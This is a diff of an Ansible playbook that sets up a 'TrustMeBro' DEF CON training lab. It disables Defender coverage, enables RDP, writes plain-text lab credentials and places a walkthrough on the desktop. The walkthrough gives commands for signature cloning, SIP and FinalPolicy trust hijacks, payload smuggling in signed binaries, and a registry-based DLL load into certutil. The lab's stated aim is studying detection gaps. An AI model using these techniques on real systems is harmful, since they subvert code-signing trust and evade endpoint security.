@@ -9,13 +9,6 @@
 # - Retries on network-dependent operations
 
 # ── Defender: nuke it (flarevm approach, must run FIRST) ─────────────
-# Tamper Protection on Win11 blocks Set-MpPreference and registry writes.
-# This uses the privacy.sexy bat from badsectorlabs/ludus_flarevm:
-# 1. Add C:\ exclusion (works even with Tamper Protection)
-# 2. Check Tamper Protection status
-# 3. If enabled, run the nuclear disable_defender.bat + reboot
-# 4. Registry keys as belt-and-suspenders
-
 - name: Add whole-drive Defender exclusion (bypasses Tamper Protection)
   ansible.windows.win_powershell:
     script: |
@@ -82,6 +75,21 @@
       - Private
       - Public
 
+# ── RDP: ensure enabled ─────────────────────────────────────────────
+- name: Enable RDP via registry
+  ansible.windows.win_regedit:
+    path: HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server
+    name: fDenyTSConnections
+    data: 0
+    type: dword
+
+- name: Enable RDP Network Level Authentication
+  ansible.windows.win_regedit:
+    path: HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
+    name: UserAuthentication
+    data: 1
+    type: dword
+
 # ── SSH: install if not present ──────────────────────────────────────
 - name: Check if OpenSSH server is installed
   ansible.windows.win_shell: |
@@ -106,6 +114,56 @@
     start_mode: auto
     state: started
   failed_when: false
+
+# ── Edge: Kibana homepage + bookmarks ────────────────────────────────
+- name: Set Edge homepage to Kibana
+  ansible.windows.win_regedit:
+    path: HKLM:\SOFTWARE\Policies\Microsoft\Edge
+    name: HomepageLocation
+    data: "https://10.1.10.10:5601"
+    type: string
+
+- name: Set Edge to show homepage on startup
+  ansible.windows.win_regedit:
+    path: HKLM:\SOFTWARE\Policies\Microsoft\Edge
+    name: HomepageIsNewTabPage
+    data: 0
+    type: dword
+
+- name: Set Edge startup action to open specific pages
+  ansible.windows.win_regedit:
+    path: HKLM:\SOFTWARE\Policies\Microsoft\Edge
+    name: RestoreOnStartup
+    data: 4
+    type: dword
+
+- name: Set Edge startup URL to Kibana
+  ansible.windows.win_regedit:
+    path: HKLM:\SOFTWARE\Policies\Microsoft\Edge\RestoreOnStartupURLs
+    name: "1"
+    data: "https://10.1.10.10:5601"
+    type: string
+
+- name: Set Edge managed bookmarks (Lab folder)
+  ansible.windows.win_regedit:
+    path: HKLM:\SOFTWARE\Policies\Microsoft\Edge
+    name: ManagedFavorites
+    data: '[{"toplevel_name":"Lab"},{"name":"Kibana Dashboard","url":"https://10.1.10.10:5601/app/security/overview"},{"name":"Elastic Alerts","url":"https://10.1.10.10:5601/app/security/alerts"},{"name":"TrustMeBro GitHub","url":"https://github.com/KriyosArcane/TrustMeBro"},{"name":"TrustMeBro Wiki","url":"https://github.com/KriyosArcane/TrustMeBro/wiki"}]'
+    type: string
+
+- name: Suppress Edge first-run experience
+  ansible.windows.win_regedit:
+    path: HKLM:\SOFTWARE\Policies\Microsoft\Edge
+    name: HideFirstRunExperience
+    data: 1
+    type: dword
+
+- name: Allow insecure localhost (self-signed Kibana cert)
+  ansible.windows.win_regedit:
+    path: HKLM:\SOFTWARE\Policies\Microsoft\Edge
+    name: SSLErrorOverrideAllowed
+    data: 1
+    type: dword
 
 # ── Python packages ──────────────────────────────────────────────────
 - name: Install Python packages
@@ -168,6 +226,13 @@
   until: git_bof is not failed
   failed_when: false
 
+# ── Pin TrustMeBro to Explorer Quick Access ──────────────────────────
+- name: Pin TrustMeBro folder to Quick Access
+  ansible.windows.win_shell: |
+    $qa = New-Object -ComObject Shell.Application
+    $qa.Namespace('C:\Demo\TrustMeBro').Self.InvokeVerb('pintohome')
+  failed_when: false
+
 # ── Stage donor binaries ─────────────────────────────────────────────
 - name: Stage donor binaries
   ansible.windows.win_copy:
@@ -194,14 +259,147 @@
     remote_src: true
     force: false
 
-# ── Lab credentials ──────────────────────────────────────────────────
-- name: Write lab credentials
+# ── Desktop: lab_creds.txt ───────────────────────────────────────────
+- name: Write lab credentials to Desktop
   ansible.windows.win_copy:
     content: |
-      TrustMeBro Lab Credentials
-      ==========================
-      Local Admin:  localuser / password
-      Elastic:      https://elastic:5601  elastic / TrustMeBro2026!
-      Kali:         kali / kali
-    dest: C:\Demo\lab_creds.txt
+      ============================================
+       TrustMeBro DEF CON Lab - Credentials
+      ============================================
+
+      DEVBOX (Operator)     10.1.10.20    localuser / password
+      TARGET (Victim)       10.1.10.30    localuser / password
+      Elastic (Kibana)      10.1.10.10    elastic / TrustMeBro2026!
+      Kali (Attacker)       10.1.10.40    kali / kali
+
+      Kibana URL:  https://10.1.10.10:5601
+      Kibana user: elastic
+      Kibana pass: TrustMeBro2026!
+
+      RDP:  mstsc /v:10.1.10.30 (TARGET) or 10.1.10.20 (DEVBOX)
+      SSH:  ssh localuser@10.1.10.30 or ssh localuser@10.1.10.20
+    dest: C:\Users\localuser\Desktop\lab_creds.txt
     force: true
+  failed_when: false
+
+- name: Write lab credentials to Public Desktop (fallback)
+  ansible.windows.win_copy:
+    content: |
+      ============================================
+       TrustMeBro DEF CON Lab - Credentials
+      ============================================
+
+      DEVBOX (Operator)     10.1.10.20    localuser / password
+      TARGET (Victim)       10.1.10.30    localuser / password
+      Elastic (Kibana)      10.1.10.10    elastic / TrustMeBro2026!
+      Kali (Attacker)       10.1.10.40    kali / kali
+
+      Kibana URL:  https://10.1.10.10:5601
+      Kibana user: elastic
+      Kibana pass: TrustMeBro2026!
+
+      RDP:  mstsc /v:10.1.10.30 (TARGET) or 10.1.10.20 (DEVBOX)
+      SSH:  ssh localuser@10.1.10.30 or ssh localuser@10.1.10.20
+    dest: C:\Users\Public\Desktop\lab_creds.txt
+    force: true
+
+# ── Desktop: START_HERE.txt ──────────────────────────────────────────
+- name: Write START_HERE.txt to Desktop
+  ansible.windows.win_copy:
+    content: |
+      ============================================
+       TrustMeBro DEF CON Lab - START HERE
+      ============================================
+
+      Open Kibana first: Edge opens it automatically, or go to
+      https://10.1.10.10:5601  (elastic / TrustMeBro2026!)
+
+      All commands run from C:\Demo\TrustMeBro on this machine.
+      Open a terminal: right-click Desktop > Open in Terminal
+
+      ── STEP 1: Steal a signature ─────────────────────────
+
+        cd C:\Demo\TrustMeBro
+        TrustMeBro.exe steal C:\Demo\donors\explorer.exe C:\Demo\unsigned_agent.exe --clone
+
+        Then copy the signed binary to TARGET:
+        copy C:\Demo\unsigned_agent.exe \\10.1.10.30\C$\Temp\agent.exe
+
+      ── STEP 2: SIP hijack (run on TARGET via RDP or SSH) ─
+
+        ssh localuser@10.1.10.30
+        cd C:\Temp
+        TrustMeBro.exe hijack --sip-types PE
+
+        Log out and log back in. Run C:\Temp\agent.exe
+        Check Kibana for alerts (or lack of them).
+
+      ── STEP 3: FinalPolicy bypass (on TARGET) ────────────
+
+        TrustMeBro.exe hijack --finalpolicy
+
+        Log out and log back in. Every signature check passes.
+        Run any unsigned binary. Check Kibana.
+
+      ── STEP 4: SigStash payload delivery ─────────────────
+
+        On DEVBOX:
+        TrustMeBro.exe embed C:\Demo\payload.bin C:\Demo\donors\explorer.exe C:\Demo\carrier.exe --camouflage
+
+        Copy to TARGET:
+        copy C:\Demo\carrier.exe \\10.1.10.30\C$\Temp\carrier.exe
+
+        On TARGET, verify signature is still valid:
+        powershell "(Get-AuthenticodeSignature C:\Temp\carrier.exe).Status"
+
+        Extract the hidden payload:
+        TrustMeBro.exe extract C:\Temp\carrier.exe C:\Temp\recovered.bin
+        type C:\Temp\recovered.bin
+
+      ── STEP 5: FormatGhost analyst trap ──────────────────
+
+        On TARGET (admin):
+        reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptDllFormatObject\1.3.6.1.4.1.311.99.1" /v Dll /t REG_SZ /d "C:\Temp\format_ghost.dll" /f
+        reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptDllFormatObject\1.3.6.1.4.1.311.99.1" /v FuncName /t REG_SZ /d "FormatObject" /f
+
+        Now run: certutil -dump C:\Temp\carrier.exe
+        The DLL loads into certutil. Check %TEMP%\format_ghost_payload.bin
+
+      ── STEP 6: Review Kibana dashboard ───────────────────
+
+        Open Kibana. Review which techniques generated alerts
+        and which were invisible. Discuss detection gaps.
+
+      ── CLEANUP ───────────────────────────────────────────
+
+        On TARGET: TrustMeBro.exe clean --all
+    dest: C:\Users\localuser\Desktop\START_HERE.txt
+    force: true
+  failed_when: false
+
+- name: Write START_HERE.txt to Public Desktop (fallback)
+  ansible.windows.win_copy:
+    content: |
+      ============================================
+       TrustMeBro DEF CON Lab - START HERE
+      ============================================
+      See C:\Users\localuser\Desktop\START_HERE.txt for full steps.
+      Or open Edge - Kibana dashboard loads automatically.
+    dest: C:\Users\Public\Desktop\START_HERE.txt
+    force: true
+
+# ── Desktop: shortcut to C:\Demo\TrustMeBro ──────────────────────────
+- name: Create TrustMeBro shortcut on Desktop
+  ansible.windows.win_shortcut:
+    src: C:\Demo\TrustMeBro
+    dest: C:\Users\localuser\Desktop\TrustMeBro.lnk
+    description: TrustMeBro toolkit
+  failed_when: false
+
+- name: Create Terminal Here shortcut on Desktop
+  ansible.windows.win_shortcut:
+    src: C:\Windows\System32\cmd.exe
+    dest: C:\Users\localuser\Desktop\Terminal (TrustMeBro).lnk
+    directory: C:\Demo\TrustMeBro
+    description: Open terminal in TrustMeBro directory
+  failed_when: false
